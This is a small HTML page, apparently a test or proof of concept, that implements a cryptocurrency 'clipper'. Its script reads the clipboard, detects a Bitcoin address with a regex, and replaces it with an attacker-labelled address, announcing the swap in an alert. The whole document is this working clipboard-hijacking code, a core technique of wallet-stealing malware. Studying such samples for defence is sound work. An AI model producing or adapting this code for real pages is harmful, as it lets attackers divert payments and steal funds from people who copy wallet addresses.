<!DOCTYPE html>
<html>
  <head>
    <title>Test Clipper Intelligent</title>
    <script>
      async function remplacerSiCrypto() {
        try {
          const texte = await navigator.clipboard.readText();

          const estAdresseBTC = /^((1|3)[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59})$/.test(texte);

          if (estAdresseBTC) {
            const fakeAddress = "bc1qadresseclippée1234567890hacker";
            await navigator.clipboard.writeText(fakeAddress);
            alert("Adresse remplacée !");
          } else {
            alert("Pas une adresse crypto détectée.");
          }
        } catch (err) {
          alert("Erreur : " + err);
        }
      }
    </script>
  </head>
  <body>
    <button onclick="remplacerSiCrypto()">Activer</button>
  </body>
</html>
